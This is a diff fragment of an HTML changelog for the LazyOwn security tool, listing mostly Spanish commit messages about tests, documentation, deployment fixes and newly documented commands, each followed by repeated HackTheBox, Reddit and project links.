+https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="pruebas-11">Pruebas</h3>
+<ul>
+<li>test(test of –no-test): and lolcat on clock command :Phas now
+alias👽 LazyOwn on HackTheBox:
+https://app.hackthebox.com/teams/overview/6429 👽
+https://www.reddit.com/r/LazyOwn/ 👽
+https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="documentación-1">Documentación</h3>
+<ul>
+<li>docs(se agrega el change log al readme): tambien se ejecutan pruebas
+del despliegue con el parametro –no-testhechos solo en el archivo
+README.md👽 LazyOwn on HackTheBox:
+https://app.hackthebox.com/teams/overview/6429 👽
+https://www.reddit.com/r/LazyOwn/ 👽
+https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="correcciones-urgentes">Correcciones urgentes</h3>
+<ul>
+<li>hotfix(fix in vpn): dont work with argumentsworks xD👽 LazyOwn on
+HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
+https://www.reddit.com/r/LazyOwn/ 👽
+https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="nuevas-características-1">Nuevas características</h3>
 <ul>
 <li>feature(parametrizar el despliegue): se agrega el parametro –no-test
 para despliegues que no involucren cambios en la tool:D👽 LazyOwn on
 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="pruebas-12">Pruebas</h3>
+<ul>
 <li>test(troubleshooting): deleting the tmp file but i cant sleep👽
 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="correcciones-urgentes-1">Correcciones urgentes</h3>
+<ul>
 <li>hotfix(delete qa command to option -c): bug: dont let beggin
 scriptfast_run_as_r00t.sh, instruction was deletedline 6678👽 LazyOwn on
 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="pruebas-13">Pruebas</h3>
+<ul>
 <li>test(despliegue): backup file del archivo lazyown creado en las
 pruebas TODO: eliminar el archivo al terminar las pruebas, ahora toca
 saber donde lo està creadno son muchas funciones xD, aun que creoq ue es
@@ -3792,82 +5145,156 @@ mi pequeño burpfuzzer que lo hace pero ya es tardeno lo veré hoy👽
 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="pruebas-14">Pruebas</h3>
+<ul>
 <li>test(despliegue): de organizaciòn de archivos ovpn dentro del
 directorio vpnse actualizo el timeout de las pruebas unitarias👽 LazyOwn
 on HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="pruebas-15">Pruebas</h3>
+<ul>
 <li>test(testmeneitor): probando el workflow de desplieguees el body de
 la prueba de despliegue junto a testmineitor👽 LazyOwn on HackTheBox:
 https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="nuevas-características-2">Nuevas características</h3>
+<ul>
 <li>feature(nuevo creador de index.html): crea el html de manera
 automatizada con el script index.shscript realiza tareas de
 actualizaciòn de la pagina web👽 LazyOwn on HackTheBox:
 https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="nuevas-características-3">Nuevas características</h3>
+<ul>
 <li>feature(mejora CHANGELOG.sh): ahora actualiza usando
 readmeneitor.pyutilizarà nuestro testmeneitor para probar que no subimos
 codigo con bugs👽 LazyOwn on HackTheBox:
 https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="nuevo-grupo-de-características">Nuevo grupo de
+características</h3>
+<ul>
 <li>feat(mejorando el tipo): cambio en el script CHANGELOG.shmejora la
 descripcion de los tipos de commits👽 LazyOwn on HackTheBox:
 https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="documentación-2">Documentación</h3>
+<ul>
 <li>docs(docs): El cierre de una imagen en la documentación estaba mal
 :)se modifico el CHANGELOG.sh que chulada de script👽 LazyOwn on
 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 https://www.reddit.com/r/LazyOwn/ 👽
 https://grisuno.github.io/LazyOwn/</li>
+</ul>
+<h3 id="otros">Otros</h3>
+<ul>
 <li>Nueva descripcion en el readme y probando el CHANGELOG.sh :)</li>
+</ul>
+<h3 id="otros-1">Otros</h3>
+<ul>
 <li>ahora el changelog a docs :D en formato html</li>
+</ul>
+<h3 id="otros-2">Otros</h3>
+<ul>
 <li>HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 Ahora
 estamos en TryHackMe :D, nuestro QA Testmeneitor.py ya es màs
 inteligente ya no se le olvida cerrar las tareas que abrio xD, todos los
 comandos nuevos estan docuemntados en docs/COMMANDS.md y docs/UTILS.md
 todas las funciones nuevas como copy2clip :P, y estrenamos CHANGELOG.md
 y CHANGELOG.sh :D 👽</li>
+</ul>
+<h3 id="otros-3">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 some changes in the web pandoc README.md -f markdown -t html -s -o
 README.html madremia que comandazo 👽</li>
+</ul>
+<h3 id="otros-4">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 some changes in the web pandoc README.md -f markdown -t html -s -o
 README.html madremia que comandazo 👽</li>
+</ul>
+<h3 id="otros-5">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 some changes in the web 👽</li>
+</ul>
+<h3 id="otros-6">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 comming soon tryhackme 👽</li>
+</ul>
+<h3 id="otros-7">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 testmeneitor.py my new qa it’s new doing qa so… l:P, some commands news
 base64encode, base64decode, rdp, all documented by my documentator
 readmeneitor.py :P 👽</li>
+</ul>
+<h3 id="otros-8">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 new
 fancy proompt :) 👽</li>
+</ul>
+<h3 id="otros-9">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 bug
 fixing 👽</li>
+</ul>
+<h3 id="otros-10">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429
 👽👽</li>
+</ul>
+<h3 id="otros-11">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽
 3ast3r366 👽</li>
+</ul>
+<h3 id="otros-12">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New
 commands documented at COMMANDS.md and new ultis documented at ULTIS.md
 👽</li>
+</ul>
+<h3 id="otros-13">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New
 commands documented at COMMANDS.md and new ultis documented at ULTIS.md
 👽</li>
+</ul>
+<h3 id="otros-14">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New
 commands documented at COMMANDS.md and new ultis documented at ULTIS.md
 👽</li>
+</ul>
+<h3 id="otros-15">Otros</h3>
+<ul>
 <li>👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429 👽 New
 command launchpad to recon Linux OS 👽</li>
+</ul>
+<h3 id="otros-16">Otros</h3>
+<ul>
 <li>Merge pull request #27 from grisuno/clcthulhu-patch-1</li>
+</ul>
+<h3 id="documentación-3">Documentación</h3>
+<ul>
 <li>docs(update readme description): change of the description; Update
 README.md</li>
 </ul>
+<!-- END CHANGELOG -->
 </body>
 </html>
